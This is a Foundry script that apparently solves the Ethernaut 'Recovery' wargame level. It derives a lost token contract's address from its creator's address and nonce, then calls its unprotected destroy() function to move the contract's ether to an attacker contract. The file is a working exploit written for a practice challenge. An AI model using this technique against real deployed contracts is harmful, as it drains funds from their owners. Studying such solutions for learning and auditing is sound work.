// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Recovery.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    constructor () {}

    receive() external payable {
        console.log("AttackerContract received : ", msg.value);
    }   
}

contract RecoverySolution is Script {
    Recovery public recovery = Recovery(0xcfe978A0510cE38415F850c8b1472e3afc68daB5);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));

        address simpleTokenAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(recovery), bytes1(0x01))))));

        AttackerContract attackerContract = new AttackerContract();
        SimpleToken simpleToken = SimpleToken(payable(simpleTokenAddress));

        console.log("SimpleToken Address : ", simpleTokenAddress);
        console.log("Before SimpleToken Balance : ", address(simpleTokenAddress).balance);

        simpleToken.destroy(payable(address(attackerContract)));

        console.log("After SimpleToken Balance : ", address(simpleTokenAddress).balance);
        console.log("AttackerContract Balance : ", address(attackerContract).balance);
        
        vm.stopBroadcast();
    }
}